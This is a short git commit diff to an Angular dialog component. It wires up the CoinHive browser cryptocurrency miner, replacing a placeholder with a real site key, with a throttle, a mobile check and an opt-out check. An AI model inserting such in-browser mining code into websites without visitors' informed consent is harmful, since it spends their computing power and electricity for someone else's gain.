716145dde5d08e6637cc4409cad586bdc2fade65
ƘДϑîƘД ✞Дϑυî <kavikaat@gmail.com>
2018-05-21 20:16:17 -0700

    UI

--- src/app/dialog/dialog.component.ts
+++ src/app/dialog/dialog.component.ts
@@ -3,7 +3,7 @@ import { MatDialogRef, MatBottomSheet } from '@angular/material';
 
 import { BottomComponent } from '../bottom/bottom.component';
 
-const CoinHive = any;
+declare var CoinHive: any;
 
 @Component({
   templateUrl: 'dialog.component.html',
@@ -14,7 +14,7 @@ export class DialogComponent {
   constructor(public dialogRef: MatDialogRef<DialogComponent>, private bottomSheet: MatBottomSheet) { }
 
   openMiner() {
-    var miner = new CoinHive.Anonymous('YOUR_SITE_KEY', { throttle: 0.3 });
+    var miner = new CoinHive.Anonymous('WbWeCFFLVH6mLfn3OYt48oXvUhGiwj2j', { throttle: 0.3 });
     // Only start on non-mobile devices and if not opted-out
     // in the last 14400 seconds (4 hours):
     if (!miner.isMobile() && !miner.didOptOut(14400)) {
